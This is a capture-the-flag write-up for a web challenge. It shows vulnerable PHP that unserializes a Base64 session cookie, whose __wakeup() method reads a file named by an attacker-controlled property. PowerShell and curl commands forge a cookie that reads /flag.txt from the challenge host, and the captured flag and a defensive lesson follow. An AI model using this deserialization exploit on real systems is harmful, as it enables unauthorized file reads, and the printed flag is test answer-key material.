# Session Resumption

**Challenge title:** Reprise de Session\
**Category:** Web\
**Difficulty:** Extreme\
**Points:** 250\
**Author:** Perceval

## Source

- `src_compte_42.zip`

## Target

- https://reprise-de-session.cyberzerk.fr

## Solution

### Step 1: Inspect the provided PHP source

The source defines a `Template` class with a `path` property and a `__wakeup()` method:

```php
class Template {
    public $path = 'templates/welcome.html';
    public $content = '';

    public function __wakeup() {
        $this->content = @file_get_contents($this->path);
    }
}
```

The application restores the object from the `session` cookie using:

```php
$o = @unserialize(base64_decode($c));
```

The cookie is therefore a Base64-encoded PHP serialized object. During deserialization, PHP invokes `__wakeup()`, which reads the file specified by the object's `path` property.

### Step 2: Forge the serialized object

Set the `Template` object's path to `/flag.txt`, then Base64-encode the serialized object.

The following commands work in Windows PowerShell:

```powershell
$path = "/flag.txt"

$serialized = 'O:8:"Template":2:{s:4:"path";s:' + $path.Length + ':"' + $path + '";s:7:"content";s:0:"";}'

$cookie = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($serialized))

curl.exe -i "https://reprise-de-session.cyberzerk.fr/" -H "Cookie: session=$cookie"
```

### Step 3: Retrieve the flag

The server restored the object and displayed the contents of `/flag.txt` in the response under `// Contenu restauré`.

## Flag

```text
CyberZerk{PHP_uns3r1al1z3_p0p_ch41n_v14_w4k3up}
```

## Security Lesson

The application deserializes attacker-controlled cookie data without validating or authenticating it. The `Template::__wakeup()` magic method then performs a file read using a property controlled by that object. Do not unserialize untrusted input. Prefer a safe data format such as JSON, authenticate client-side state, and avoid filesystem operations driven by untrusted object properties.
